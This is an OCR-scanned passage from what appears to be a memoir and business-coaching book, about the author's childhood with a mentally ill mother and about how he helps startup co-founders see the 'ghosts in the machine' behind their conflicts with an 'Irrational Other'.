my\nfather, against my mother, against a world that was confusing, insensible,\ninfuriating, and frightening. It was a time when Mom’s crazy, irrational\nrants frightened me less while Dad’s shrugging shoulders and his\n“Whatareyagonnadobout it?” ways enraged me more.\n\n“Don’t talk like that,” he’d say over and over. “You’ll upset her. Don’t\nupset your mother.” Whatever you do, don t upset your mother.\n\nIn the shadow of the Wonder Wheel, I hid amid the seagull shit and axle\ngrease at its base where, as I once wrote in a poem, I hid my heart—buried\nit, if you will—in the sand beneath the boardwalk. I was hiding and, yet\nagain, wishing to be found.\n\nMy father’s fear-filled admonition was seared into my body like a brand.\nI distinctly remember one of the few times he and I ever talked about it,\nabout what her crazy rants did to him. He told me of the toll it took on his\nbody but, as with so much about my mother’s illness, it was only obliquely\nreferred to, approached from an indirect angle.\n\nLike so many times before, we sat at the kitchen table, another burning\nWinston in the black ashtray. My father had taken his seat and I mine,\npulling at the white cotton threads beneath the torn vinyl] tablecloth.\n\nAfter he’d lost his first job, he was low man on the totem pole, and the\nbest the union could do was get him work at another printing company.\nEvery night, precisely at nine thirty, he’d call home from work to see how\nwe were all doing. “I never knew what to expect,” he told me. “I never\nknew if your mother would be upset or not. Sometimes I was so scared that\nmy gut would clench and I would get the runs.”\n\nLike so many of us, I cared for both of my parents. So much so that I\ninherited my father’s gut-clenching fear. “Don’t upset your mother,” entered\nmy body and came out as “Don’t upset the Other.” It manifested as an\nobsessive vigilance wherein I learned to watch the Other’s every step, every\nbreath, every pause, or furrow of a brow for clues as to what they might say\nor do next. The vigilance was honed until it became, if you will, a skill, a\nsuperpower, all in service to not upsetting the Other.\n\nIn the process of our becoming, the admonitions of our parents, the rules\nby which our families operated and created a sense of belonging, become\nthe rules upon which our survival depends. “Don’t upset your mother”\ncarried not only an implicit warning—it is dangerous to upset your mother\n—but a guideline for dealing with the world, with other people—with the\nOther, even those we see as crazy: “Don t upset the Other.”\n\nTo belong, to be a member of the tribe, safe from being thrust out of the\nonly home we know, we internalize the task of making sense of the Other.\nThen, when the Other acts irrationally—or, importantly, with a rationale\nthat we can’t discern, we get ensnared in a logical trap: It’s dangerous to\nupset the Other. So, our “job” is not only to keep the Other from becoming\nupset but to bring the Other back to making sense, to not being upset. We\nbecome the guardians of those who should be protecting us. We task\nourselves with being the firm ground upon which they can stand despite\ntheir unsteadiness.\n\nCold, scared, confused, and under the Wonder Wheel at the age of\nfifteen, I began for the first time to see the futility of trying to engage with\nthe Irrational Other. I began to see the trap. I stood up, shouting, “Fuck!” I\nturned to the sea and declared: “This is not going to be my life,” and fell to\nmy knees, shaking, sobbing.\n\nLooking back now, I see that moment as a declaration of freedom, an\nintention to free myself from the patterns of behavior and belief that had\nbeen shaped by my family life. When I returned home later that same\nevening, my father was shocked; he hadn’t even noticed I’d been gone.\n\nMy brother John met me in my bedroom, “Are you okay?”\n\n“Yeah,” I said. We hugged and we cried.\n\n“Don’t do that again,” he said, laughing and crying. “Don’t you leave\nme,” he added. “But if you do, you’d fucking better take me with you.”\n\nI watched him walk away and tured to rip a page from my black-and-\nwhite marble composition notebook, my journal. I wrote a note: “It’s\nabsolutely irrational to try to argue rationally with someone who is being\nirrational.” I pulled a photo from a bent, clear Lucite frame, tossed it aside,\nand slipped the note inside, leaving it on my dresser top where I would see\nit every day for the next few years.\n\nTo hell with not upsetting your mother. To hell with not upsetting the\nIrrational Other. I was not going to live that life, under the weight of my\nfather’s gut-clenching, runs-inducing fears.\n\nLooking back over the decades that followed, I came to understand that\nthis wasn’t merely my work. To be free, each of us must come to\nunderstand the causes and conditions of our childhood. For these gave rise\nto the rules by which we, as adults, live—the rules whose original purpose\nwas to keep us safe and that create the conditions we desperately want to\nchange.\n\nGhosts in the Machine\n\nSoftware developers, borrowing from writer Arthur Koestler, define left-\nover, outmoded code, no-longer-useful subroutines, buried deep within a\ncurrent version of a program as ghosts in the machine. While once useful,\nthis outmoded coding starts to get in the way of current operations.\n\nLike everyone, I have millions of lines of such code, operating\ninstructions for how to navigate the world and relationships, which add up\nto hundreds of ghosts in the machine of my mind.\n\nWhen I encounter an irrational person, I still avoid arguing. My first\nimpulse is to stifle my feelings. When that fails, I flee. I physically leave.\nBut if I can’t physically remove myself, I disassociate—the true “me” will\nhide and the meat bag of me will stay put: hidden but not hidden, there but\nnot there.\n\nWhen those strategies fail, ] ‏آ1‎ turn to making sense of the insensible and\ntry to comprehend the incomprehensible. My journals are filled with\ndiagrams of arguments, lawyer-like briefs, and lots and lots of enumerated\npoints; as if ’ve become a trial lawyer, a prosecutor, extracting some odd\nsense of justice.\n\nJournaling. Constantly journaling. Replaying again and again the scenes\nof the irrational encounter, refining ex post facto rationales I could have\nused, should have used. My ghosts shape every aspect, let alone every\nrelationship, of my life but they’re most powerful when I encounter the\nIrrational Other.\n\nThe Irrational Other\n\nWhat makes the Other irrational? Sometimes it’s because they’re downright\ncrazy; they are dealing with extreme disorders of the mind. But more often\nit’s simply because the rules they live by, the ghosts in their machines, are\nsimply . . . different.\nEven then, it’s more than simply the differences that can cause each of us\nto seem irrational to someone else. Usually, the lack of awareness, the lack\nof understanding of why we do what we do—coupled with our inability or\nunwillingness to explain the roots of our rules—convey the sense of\nirrationality.\n\nA co-founder may look at my extreme vigilance, for example, and see\nonly a replication of my father’s obsessive focus on correcting others’\nmistakes, their typos. Without my own radical self-inquiry and, further, my\nwillingness to explore that tendency in the safety of an adult relationship,\nthey’re left without the understanding that that passive-aggressive\n“correcting” is rooted in the effort to stay safe.\n\nMoreover, without my own exploration of the roots of that, I stand little\nchance of changing behavior others find irrational and frustrating. In my\nattempt to feel safe and that I belong, I may inadvertently drive away the\nvery people who could best help me feel loved, safe, and that I belong.\n\nThese ghosts in the machine maintain themselves; the coding replicates\nand mutates, embedding deeper and deeper in the relationships that define\nour loves and our lives.\n\nEncoded in the operating systems of our minds, such ghosts\nunconsciously determine who gets chosen as our partners and precisely the\nways they drive us nuts. Moreover, the places we work, our professional\nlives, can also become a suffocating web of complex reenactments, the\ntripwires of past traumas laid out where unsuspecting colleagues are bound\nto trigger us.\n\nDealing with what I’ve come to see as this never-ending supply of\nIrrational Others is the number one challenge facing many of the\nentrepreneurs with whom I work.\n\n“T just can’t deal with him,” she says. I sense her pacing the floor as she\nspeaks to me on the phone. “He says ‏”عط‎ [1 do something and then he up and\nleaves. He’ll leave early on a Friday. Or, worse, tell me that he’s headed out\nfor vacation and then delay his return, despite assuring us all that he’Il be\nback in time for the work.” Her breaths came faster and faster as she shared\nher frustration, “and when he does, finally, return, he says nothing about his\nbroken promises.”\n\nShe’s CEO and the “he” is her co-founder. They’ ve been together for\nyears. I’ve been working with the CEO for just over a year and in that time\noccasionally had sessions—walks and deep talks—with her co-founder.\nDespite the company’s success, it still felt stuck, mired in a swamp of\nindecision, infighting, and toxic back-biting.\n\nTo the folks who interviewed for jobs at the company, the place seemed\nidyllic. The beautiful offices hummed with a lively and genuine care for\ntheir work in the world. But after months of working together, and\ndeveloping trust with my client’s colleagues, I sensed their feelings, too, of\na subterranean wrongness pervading the office.\n\nThe wrongness in the office presaged the wrongness, the “something is\noff,” in the relationship between my client and her co-founder. But, like the\noffice, by all outward appearances, the relationship was idyllic. Yet, in\nprivate, each thought the other was at fault.\n\nSorting it out was more than just a matter of sorting through the she\nsaid/he said; more than a matter of picking a side and saying who was\n“right.” ‏4٭]‎ stepped into a deeply codependent relationship akin to the most\ndysfunctional marriages I’ve known, where each side of the pair called the\nother “stubborn,” “closed-minded,” and “irrational.”\n\nHer impulse, like the impulse of nearly all my clients, was to analyze the\nIrrational Other to figure out what was wrong with them so that they could\nbe fixed, changed, made better. That was often a cover for another impulse,\nwhich was to figure out what was wrong with the Other so that they could\njustify the ending of the partnership, overcoming guilty feelings.\n\nThinking back to my boot-camper and his greedy head of sales, I asked\nthe CEO a similar question: “Okay, if he’s so awful, why after all these\nyears haven’t you fired him?”\n\nWe began to unpack the relationship. How did it begin? “He was a\nvisionary,” she shared. “I needed him so much.”\n\nShe told stories of late-night gripe sessions and even later-into-the-night\nsessions of plotting their escape from the European Global 100 company\nwhere they’d worked. In the earliest days, there was a third, a mutual friend\nwho was the technical genius. The three of them had made a great team.\n\n“What happened to the friend?” I asked.\n\n“Oh, we kicked him out after the first year—he wasn’t pulling his\nweight.”\n\nThree becoming two made me curious. What was at play here? What was\nreally going on in this relationship? To be clear, the company’s work had\nbeen amazing. They’d built an incredibly successful company. They were\nmaking a difference in the lives of millions of people. Still, the\nundercurrents of dissatisfaction and resentment were as much a part of the\nculture as their expressed desire to create something lasting and beautiful.\n\nA breakthrough came when my client described how uncomfortable—her\nword—she was when her co-founder had approached her with some\ngenuine and authentic concerns. Earlier in the week I’d encouraged him to\nspeak directly with her. In doing so, he’d triggered a level of contempt in\nmy client she had not realized she’d felt for him.\n\n“Worse than promising something and failing to deliver was having him\ncry and tell me he was scared,” she said, nearly yelling and clearly angry\nwith me. “TI think I need him to be disappointing and emotionally distant.”\n\nI reflected back to her what she’d just said: “You need him to be a\ndisappointing and emotionally distant man.”\n\n“Oh, fuck,” she said, seeing a connection, a ghost in her machine, “He’s\nmy father.” Her father was a man whose ability to be emotionally present\ndepended on alcohol, whose drinking often ended in long, unexpected\ndisappearances, and whose returns were marked by a terrifying\nsecretiveness, since neither of her parents ever spoke about the fact that Dad\nhad disappeared.\n\nIt was and is much more complex than that, of course. But that was and is\none deep and unconscious component of their decadelong codependency:\nShe needed to have a partner who, in effect, promised her freedom (“He\nwas a visionary”; “We plotted our escape together”; “He wouldn’t mention\nhis broken promises”) but disappointed her time and again, with the greatest\ndisappointment being the untrustworthy illusion of emotional intimacy.\n\nOn his side, he needed to disappoint the in-charge, take-charge woman\nwho saw in him a promising future. He was unconsciously compelled to\nrepeat his childhood scenes of having a mother whose wishes for her son\nwould be dashed time and again.\n\nThey’d tried for years to break the dynamic. They’d hired consultants to\nredo their tiny organizational structure, thinking the root of the problem was\nthat they were not dividing the work between them well enough.\n\nAll the time, neither suspected that the feeling of being stressed by too\nmuch work and not enough time was, in fact, hardwired into their\nrelationship. As part of the complex, family-of-origin-based coding, they\neach needed to blame the other for the continuous sense of not having\nenough time. “If only they worked harder/smarter/longer, then I wouldn’t be\nso stressed.”\nOnce we laid bare the roots of the antipathy between these two people,\nwho loved each other, we began to see the ways other encoded messages\ndictated the cadence and rhythms of their lives. The ways, for example, they\nunconsciously excluded any third person from becoming a senior member\nof their team, thus inhibiting the growth of the business. Ten years after\nfounding, the senior team consisted of, well, the two of them.\n\nOr the ways in which they would each—confidentially, of course—share\na perspective on the real goings-on at the business. Or the ways that, despite\ntheir constantly complaining about the other, neither one was taking\nownership of his or her part in the mess of their relationship. The fingers\nalways pointed at the other; the inquiry never went inward.\n\nAll those ghosts in the machine, forgotten but still operating subroutines\n—outliving their usefulness and limiting our growth.\n\nI think of the pair of venture capitalists who tied their fates to each other.\nOne, my client, was by all appearances kind, caring, thoughtful, and\nbeloved. His founding partner? Irrational, hated by the communities of\nentrepreneurs and co-investors with whom their firm did business. I fielded\nquestions from throughout the start-up ecosystem: “Why would he [my\nclient] pick that guy as his partner? That guy’s a jerk.”\n\nFew—including my client until we unpacked it—understood that the jerk\nprovided a much-needed bad guy for my good-guy client to hang out with.\nAlways the good guy who did what was expected, my client needed to have\nan evil doppelganger with whom he could do drugs and party all night.\n\n“Tf he drives you crazy; if he risks the firm, your reputation, and\neverything that you’ve built,” I asked him one day, “why do you keep him\non?”\n\nHe laughed.\n\nThrough the laughter, he said, “I have no fucking idea.” And he laughed\nsome more.\n\nI pointed out the laughter and asked, “How old do you feel?”\n\nStartled, he said, “I don’t know but I feel like I’m in middle school,\ngetting away with pranks and hoping not to be caught.”\n\nFrom that brief recollection of a feeling, we unpacked the ways he was a\ngood Catholic boy, an altar boy, a choir boy, and that what he really wanted\nto be was a cool kid. His badass partner made him feel like he was finally a\nmember of the cool kids’ club, even as the adult in him recognized the\ndanger.\nWhen the Irrational Other is a sibling or a romantic partner, the\ncomplexities quickly multiply.\n\nI think of three different pairs of siblings, co-founders whose decades-old\nstruggles were rooted in late-night, shared-bedroom arguments over whom\nMom and Dad loved more. Think of the sibling rivalries no longer playing\nout over Hot Wheels and the “unfairness” of chores but over product\ndirection and whether the company should take money from a particular\ninvestor.\n\nStepping into a first meeting with one particularly troublesome pair of\nsiblings, I had to shout to be heard over their argument. Thrust into the role\nof a refereeing parent, I remember laughing as I reprimanded them: “Stop\nit. Stop this fighting or I’m walking out and never coming back.”\n\nAnd one brother, a thirty-year-old man, looking up with sheepish eyes\nand a hangdog face, saying, “But he started it.”\n\n“Yeah?” asked the other. “Well, you’ve been doing that to me my whole\nlife.” They said this in the boardroom of their four-hundred-person\ncompany.\n\nOr when one sibling takes the seat as the CEO and the other as the head\nof product. The lines of authority should be clear, but they aren’t because\nthe product-head sibling is also a board member and he is, technically, his\nsibling’s boss.\n\nThe challenges for business partners who are also life partners have a\nunique expression of this conscious/unconscious dance. One or both\npartners may feel both manifestations of the partnership (life and business)\naffected by ghosts from the family of origin, past romantic relationships,\nand/or past work experiences.\n\nOne client, a woman 111] call Virginia, was the founder and CEO of her\ncompany. Growing up admiring a thoughtful, successful but emotionally\ndistant entrepreneurial father, she tried to emulate her father’s style. Shortly\nafter founding the business, the CEO began dating her chief technical\nofficer. A little later they married. The tensions around emulating her father\n—including his emotional distance—led all her employees, including her\nCTO/husband, to never know where they stood and thus to assume that\nnothing they did was ever good enough for Virginia.\n\nDespite the insistence of the irrationality, the wrongness of the Other, we\nare never truly alone in our relationships. We are always accompanied by\nour ghosts.\nAs in so many relationships, this complex interweaving of self and\nIrrational Other relies on a combination of psychological transference. The\nIrrational Other becomes a stand-in for someone in our lives, usually from\nour past. They become a screen onto which we project our negative and\npositive qualities, those we can’t allow ourselves to acknowledge as our\nown.\n\nOne partner’s understandable impatience and focus on effectiveness\nstrike us as “irrational” because it reminds us of the ways we constantly\ndisappointed a parent. That “irrational” behavior then triggers our shame,\ncausing us to withdraw, hide, or make a process overcomplicated,\nincreasing the Other’s sense of impatience.\n\nBut the merry-go-round of transference and projection doesn’t stop there.\nOften, our unconscious will work to preserve the disappointment/shameful\nhiding/more disappointment structure because, buried deep within us is the\nbelief that however miserable the complex may make us, at the very least it\ntells us we’re alive.\n\nTo the child who lives within us and according to the ghosts in the\nmachine, these complex duets feel like home. The drama and the misery tell\nus we’re safe. We know this pattern because we’ ve been tracing it all our\nlives.\n\nWhen I can sense a complex structure such as this is at work behind the\nincessant complaining about the Irrational Other, my work shifts to helping\nthe parties see the ways the complex structures may have outlived their\nusefulness. “Put down the script,” ] 1 tell them. “You don’t have to be an\nactor in that drama anymore.”\n\nThe Immense Sky\n\n“T don’t want to play anymore.” I’m whining, and I can’t help it. “I want to\nhand back the script and stop playing the role.” This time I’m speaking with\nSharon Salzberg. Years after her book Faith broke open my heart, she’d\nbecome my teacher and someone I sat with in meditation on a regular basis.\nSomeone who could help me sort through the ghosts in my machine, ghosts\nwho would make decidedly unforgettable appearances following meditation\nsessions.\nWe’re discussing yet another agonizingly perplexing relationship in\nwhich I’m twisted, trying to make sense of my fears that the Irrational\nOther will explode in anger. “Don’t upset your mother” bounces in my\nhead.\n\n“All beings own their own karma,” Sharon reminds me, referring to the\nBuddhist law of cause and effect, “their happiness or unhappiness depends\non their actions, not my wishes for them.” All beings, I realize, including\nmy mother, including the Irrational Other.\n\nWith lovingkindness for myself (a powerful lesson from Sharon) I allow\nall the feelings of the irrational, perplexing, agonizing relationship to wash\nover me. Suddenly I see it clearly: my whining, my sense that I’m trapped\nby this relationship, my seeming powerlessness over the irrationality of the\nOther are reenactments. And with that observation I’m suddenly freed from\nthe burden, the trap of trying to make the irrational rational. Not only is it\ncompletely irrational to argue with the Irrational Other, it’s irrational to try\nto alter them so that they make sense to me.\n\nIn that moment, I realized that we all have a choice in the experience of\nthe Other. We can remain stuck. Or we can allow the Irrational Other to\nprovoke us, to wake us up to the repetition of painful habits and—with love\nand understanding for ourselves and an embrace of the ghosts in the\nmachine—we can move past any fear or shame and take a step on the path\nof awakening. We ask: How, indeed, have I been complicit in creating the\nconditions I say I don’t want? More to the point, what am I willing to give\nup to stop being complicit?\n\nThe poet Rilke warned that to love another is “perhaps the most difficult\nof all our tasks.” He also said that implicit in being in a relationship with\nthe Other is “the possibility of always seeing each other as a whole and\nbefore an immense sky.” But doing so demands realizing and accepting that\neven between the closest people, infinite distances exist.\n\nWithin those distances, beneath that immense sky, lies the possibility of\nour deepest, most radical self-inquiry: “How am I complicit in creating the\nconditions I say I don’t want?”\n\nThe key to understanding is seeing clearly your own reaction. When you\nreact with anger, fear, greed (or even with laughter, as in the case of my\nclient and his wish to be bad), it gives you a chance to see yourself more\nclearly.\nRadical self-inquiry is the path to seeing habits and patterns. Questions\nthat drive us toward that insight are endlessly helpful:\n\n* “What parts of me are being projected onto the other person?”\n* “How do I reclaim those parts of me?”\n\n* “What do my reactions say about me?”\n\ne “Why do I do what I do?”\n\ne “Why do they do what they do?”\n\n* “What need for love, safety, or belonging might they be trying to\nmeet with their irrational behavior?”\n\nAwakening is damn hard. When our wires are tripped, and the ghosts of\nthe past screech, “It’s happening again!” it’s damn hard to stand down, to\nstand still, and inquire within.\n\nHow can we disregard our fiery demand that the Other apologize, stop\ntheir nonsense at once, and change forever?\n\nIf in response to the failing, disappointing, Irrational Other, we are able to\ninquire deeply and name what it is we’re seeing, what’s really happening\nfor us, we’re often able to break the spell cast by our ghosts.\n\n“How Am I Complicit in Creating the Conditions\nI Say I Don’t Want?”\n\nAnn was struggling mightily. Her co-founder, Paul, was, in her words,\n“11001601019 indecisive” and “buffoonish and slow.” Even though she was\nthe CEO, he, as the head of strategy for the company, used his position as a\nboard member to “lord it over her,” she said, and “disrespect her by telling\nher what to do.”\n\nAnn and Paul’s friendship went back to college, and when they finished\nup graduate school, both Harvard Business School alums, they decided to\nlaunch a business together. They’d sat up late, night after night, with white\nsheets of paper, sketching out ideas. “Ann’s a natural executer,” Paul told\nme the first time we met. “I’m all about the big ideas but Ann really gets\nshit done.” It made sense that she should take on the responsibility of being\nCEO, he added, because he knew she was simply better at making the quick\ndecisions. But lately she’d been making too many decisions without\nconsulting him, and not only had he felt steamrollered but the once-critical\nbalancing act between their decision-making styles no longer worked. He\nfelt diminished and disrespected. Their differences seemed irreconcilable.\n\nHaving worked with each of them, I know each of them was speaking a\ntruth—at the very least, their feelings were true, even if, objectively, the\nfacts were slightly different from the perspectives they held. I encouraged\nthem to use the practice of mindfulness as a form of radical self-inquiry to\nbreak the spell gripping each of them and to alter the course of their\ninteractions.\n\nUnbeknownst to each of them, I had given them the exact same\ninstructions when they’d e-mailed me about how irrational the other was\nbeing. Using a particularly incendiary e-mail exchange, with its ever-\nescalating anger, I encouraged them to put down their weapons, to put down\ntheir phones.\n\n“When the ‘ding’ notifies you of a new e-mail,” I wrote to each of them.\n“Don’t answer it. Don’t even look at your phone.”\n\nI told them to sit, taking note of every feeling that came up, especially the\nbodily sensation. Note the desire to read the e-mail and note without\njumping in, giving in, the stories you might tell yourself about what the e-\nmail contained. When you find yourself following the story, ask yourself a\nquestion about your body. “Where in my body does this story live?”\n\nThe point was to encourage them to widen the gap between the stimulus,\nthe “ding,” and the response, “I can’t believe how wrong he/she is. She/he\nnever respects me.”\n\n“Tt was so painful,” Ann told me afterward. “I felt heat rising from my\nchest and going to the top of my head. I was like one of those cartoon\ncharacters where you see the head turning into a teakettle and steam coming\nout the ears.” She laughed as she recognized the deep Pavlovian call to up\nthe ante and once again explain how wrong Paul, the Irrational Other, was.\n\nInstead of steam, Paul reported crying. “I was so overcome by this deep,\ndeep well of sadness. It filled my entire chest cavity.”\n\n“How old is that sadness?” I asked him.\n\n“Very old,” he said between sobs. “It’s me, being slapped one more time\nby my mother. Me being told once more that I’m just not good enough.”\nLater, in a joint session, I asked each of them to lean into their awful,\nspiky pain; those ancient tender spots. “Stay with the bodily sensations,” I\ntold them. “Notice but don’t board the train of the thoughts that pulls into\nthe station.\n\n“See the stories you’re telling yourself about the other,” I continued.\n“What do those stories reveal about the stories that you might have been\nholding quietly, silently, for all your lives?” We sat in painful silence as they\nboth looked down and straight ahead. After what seemed like an eternity,\nAnn spoke first: “That I’m cold, uncaring, and focused only on the next step\nahead, never on the people I say I love.”\n\n“Who told you that story, Ann?” I asked.\n\n“My ex-husband. He said this was why he could not stay married to me.”\n\nWe honored the weight of that revelation with more silence. We gently\nturned to Paul.\n\n“T’ve not lived up to my potential,” he stammered. “And never will.”\n\nNodding, leaning forward, my elbows on my knees: “How old were you,\nPaul, when that story first landed in your body?”\n\n“T was so fucking little. I can’t even recall not feeling this way.”\n\nSuddenly the air flowed again in the room. All three of us were breathing.\nSpeaking to the two of them, I asked, “Did you know that this is what your\nfriend believes about themselves?”\n\nThey looked at each other and I saw two old college friends, no longer\nthe CEO and her co-founder. They saw again the two crazy-assed\nentrepreneurs who had the audacity to try and change the world. They saw\nthe Other, no longer irrational.\n\nFor this is one of the opportunities that the Irrational Other presents: to\nstand beneath the immense sky and see the Other as whole yet disturbed by\nhis or her own ghosts. Growing up, this Other could never feel safe. The\nfamily system ensured that they could never ever relax. Their blend of\nhypervigilance was designed to do the same thing as mine: keep them safe.\n\nSlowing down or, better yet, standing still and paying mindful attention\nto oneself, allows one to see past the projections, the stories we tell\nourselves about the Other, asking once more, “How am I complicit in\ncreating the conditions I say I don’t want?”\n\nThe most painful gift of the Irrational Other, then, is the opportunity to see\nourselves better. Their irrationality stems partly from our having projected\nonto them the good and the bad traits that are really ours to claim. Seeing\ntheir irrationality in this way is like encountering our reflection in a Coney\nIsland funhouse mirror: It’s us, we see, but distorted into a funny, scary\nimago of us—true but not accurate and frighteningly distorted.\n\nIf, as Jean-Paul Sartre observed, hell really is other people, then the truest\nhell is seeing ourselves in that irrational, distorting mirror.\n\nRelief can come, though, when we gaze at this distortion as if seeing the\nimmense sky containing all our positive and negative traits, as well as those\nof the Other. What is it about your co-founder’s failures as an entrepreneur\nthat disgust and enrage you? Was it perhaps because she saw in him the fact\nthat not only was he not keeping her safe but that she, like him, was failing?\n\nAnn heard something Paul never intended to communicate through his\nactions. Paul saw in Ann’s responses the distorted reflection, his own worst\nfeelings about himself.\n\nIf we gaze at that distortion with the mindful curiosity implicit in the self-\ninquiry process, we can breathe in the reality that each of us is whole,\ndisturbed merely by fragments of leftover code—ghosts. From beneath such\na sky, we begin leaning into other radical self-inquiry questions. We get to\nchoose actively our experience of being with the Other, rational or not.\n\n“What are your operating instructions?” I ask the next pair of co-founders\nwho come in with their conflicts. When the ghosts screech at you, when\nyour tripwires are triggered, what do you do? Do you retreat? Do you lash\nout?\n\nMore to the point, how would you like the Other to respond to you? Can\nyou give instructions to dial down your fear and anger? And, for extra\ncredit, when you’re responding from your most resourced place—when you\nfeel loved and safe, and your belonging is not threatened—what if you were\nable to give that feeling to the Irrational Other? What if all he needs is silent\nunderstanding and the guardianship of his solitude, so he can work through\nwhat his ghosts are demanding he work through?\n\n“Jerry, I’m going crazy,” Eliza wrote to me. “Please, can you possibly\nmake time for me?”\n\nA new client, Eliza is the co-founder and CEO of a tiny but fast-growing\ncompany. When we first met, the company had twenty employees. Seven\nmonths later, they had forty. She had just hired her first chief technology\nofficer and it was about him that she was looking for help.\n\nHe was the Irrational Other.\n“What“d he do now?” I asked her.\n\n“He always does this. He always leaves without getting his work done\nand he always leaves without even telling me he’s leaving. He’s so\ndisrespectful. I think it’s because I’m a woman.”\n\nTaking a breath, I asked her to tell me more about feeling disrespected. “I\nknow how he feels,” she said, trying to stand in his shoes. “He can’t stand\nworking for a woman.”\n\n“That’s true,” I said, noting that unconscious bias is even more rampant\nthan overt sexism. “But why would he have taken the job?” I knew she’d\njust hired him and that he’d accepted the job after turning down higher-\npaying jobs elsewhere. He had told me, and I was convinced that he was\ngenuine, that he really admired my client and was excited to work for her.\n\nI suggested she use a tactic I learned from training in nonviolent\ncommunications: OFNR. O, for observation of undeniable fact. F, for\nfeeling and assumptions about motivation and other interpretations of facts.\nN, for needs—individual as well as collective needs. R, for request... a\nrequest for an alternate way of behaving.\n\n“Start with the facts,” I told her. He left the office earlier than expected\nand he did so without telling anyone. “Then,” I explained further, “share\nhow his doing so made you feel—in this case, disrespected.\n\n“Then share with him the collective need . . . that everyone in the\ncompany has a need to feel respected. Then,” I told her, “make a request. If\nhe needs to leave early, ask that he let you know in advance.”\n\n“Tt worked!” she wrote to me a few hours later. It turned out that he’d\ngotten an emergency call from his wife, their four-year-old daughter had\nhad a raging temperature and needed to be rushed to the hospital. He hadn’t\nsaid anything about why he was leaving, he shared, because he didn’t want\nto appear weak, like he was putting family ahead of the job.\n\n“Can you believe he thought that putting family ahead of work is\nsomething I would think was weak?” she asked.\n\n“Yes, I could,” I wrote back. “He’s got a ghost in his machine just as you\nhave a ghost that tells you when someone does something unexpected and\npossibly threatening, it’s an existential disrespect.”\nForgiving the Irrational Other\n\nFrom Eliza to Virginia to Paul and Ann and the good boy/bad boy\ndoppelganger investors, each client’s experience of the Irrational Other\noffered the chance to grow. They used the awful, painful experience of\nbeing in a relationship to grow up and beyond the confines of their\nchildhoods. In looking in the funhouse mirror the Other presented they saw\ntheir ghosts and, in doing so, got to see the fullness of the Other.\n\nLooking backward, I see the brokenness of Mom’s childhood as the\nsource of her later “irrationality.” It took years of work, but I had finally\ncome to see her ghosts and the way they haunted her. Indeed, when I squint,\nI can see her father, Dominic Guido, in his fear and bewilderment, feeling\nso helpless as to, at times, lash out violently. Looking backward, standing\nside by side beneath the immense sky, I can see her as whole but\nbrokenhearted. Confused, scared, even standing beneath her own Wonder\nWheel, trying to make sense of an irrational world.\n\nIn seeing her, my archetype of the Irrational Other, as not so irrational but\nmerely human, I get to see myself in exactly the same way.\n\nLate in 2015, after a near-deadly fall, we brought Mom to a nursing\nfacility, where she would die a year later. Shortly after getting her settled\ninto the home, I flew to New York to visit her. Shocked by her frailty, I\nremember thinking that her hair, which was always so important to her,\nwasn’t right. It was flat, not teased into an updo, as it’d normally be. It\nseemed, if possible, even whiter.\n\nThe reality of her eventual death and all that had happened between us\nseemed frozen in that moment. Here she was, the scary, irrational, crazy\nOther, the woman who’d time and again left me questioning my own sanity\nand, sometimes, my desire to live. She was weak, confused, scared in her\nown right.\n\nHer eyes searched my face as well as the faces of my kids. I see her no\nlonger as the Irrational Other but as the woman who rose each Sunday to\nmake a fresh pot of tomato sauce for our Sunday dinners. In those scared\neyes, I see her strength, her ability to overcome the pain and trauma of her\nlife, the unfair and irrational pains she had to suffer. Suddenly, the smell of\nthe antiseptics of a nursing facility are replaced by the mouthwatering\nfragrance of fresh meatballs stewing in her sauce.\nI remember so much. I remember, as the pot bubbles, Dad with a copy of\nthe Sunday edition of the Daily News. “Who’s got the comics?” he’s just\nasked. “I haven’t finished the puzzle yet.”\n\nAs I stand over her bed, watching her watch my kids, scanning my face,\nher eyes asking, “What’s happening to me?” I remember long, dark walks\nfrom our house in Queens to the subway, to the A train. She and I passing\nOxford Bakery, with the bakers in the kitchen and the street filled with the\nsmell of apple turnovers and crumb cake. “German bakers,” she’d say,\n“they’re the best.” In those months after she and I moved in together and\nbefore my father and brothers, Dom and John, came to stay with us,\ntogether, just she and I would climb the steps to the elevated A train. Every\nmorning at five thirty, so she could get to her receptionist/file clerk job on\nWall Street, and where I could make it to school in Brooklyn by eight. We’d\nsit together on the subway, the heaters below the seats warming our bottoms\nand calves. Leaning into each other, I’d fall asleep on her shoulder, safe,\nwarm, and filled with the smells from a German baker.\n\nBack in the nursing facility, I am both here, with her, in the months\nbefore she has died and, somehow, back there, where the anger and\nsuffering scared me.\n\nHowever old the trope may be, I feel my father’s presence over my\nshoulder. Though dead for more than twenty-five years, he’s with us now.\nHe whispers in my ear something he’d written to me, back when I was in\nhigh school. It was the night before the opening of a show. One of the few\nstage appearances of my life, the year before I’d been picked to play\nOberon, the fairy king, in Shakespeare’s A Midsummer's Night’s Dream.\n\nUsing his treasured Parker pen, he’d written me a simple note. Even to\nthis day, I can see that looping handwriting: “Good luck,” he’d written, “or,\nas they say, “Break a leg.’” And then, after a space on the little sheet of\nyellow paper, he’d added, “No one could be prouder of you than I am right\nnow.” I carried that note in my wallet until time and age had disintegrated\nthe paper, its message etched forever into my soul.\n\nBack to Mom, lying there, scared and confused. I thanked Dad for his\nreminder and I leaned in, speaking directly into her hearing aid-less ear,\nand said, “It’s gonna be all right, Mom. I love you. I forgive you.”\n\n“Whaaat?” she said.\n\nThrough my tears I laughed. Of course, she couldn’t hear it. It didn’t\nmatter; I felt it.\nRecalling that moment now, thinking about my time in Coney Island as\nwell as all the times I ran away (literally or figuratively), I’m flooded by not\nonly forgiveness but, crazily enough, gratitude. If I had not encountered\nMom’s irrationality, if I had not actively but unconsciously sought out time\nand again the ability to reenact being in relationship with the Irrational\nOther, I would not have discovered my deeper self and all the rich resources\nthat are waiting for me to deploy.\n\nI’m sure I would have been a good person without the rigors of the\nIrrational Other. I am a good man. But without those struggles, I wouldn’t\nbe me. And the truth is, I like being me. So, thank you, Mrs. Robinson.\n\nJournaling Invitations\n\nWhy do I struggle with the folks in my life?\nWhy are relationships so difficult?\n\nWhat am I not saying to my co-founder, my\ncolleagues, my family members, my life partner that\nneeds to be said?\n\nWhat’s being said to me that I’m not hearing?\nChapter 6\nHandprints on the Canyon Wall\n\nTam closer to the age when my father died than I am to the age when I first\nbecame a father. That thought, like a whisper on the wind, startled me as I\nwalked around Wonderland Lake, in the foothills of the Rockies. As the\nmidmorning light slanted toward the hills, calling forth their very best pinks\nand grays; as the overnight dusting of frost sparkled on the flat lake water\nand crunched beneath my shoes, the thought gnawed at me. As I approach\nthe age when my father passed away, I think of how the repetition of\npatterns creates a delicate, intriguing symmetry in our lives. I passed from\nbeing the 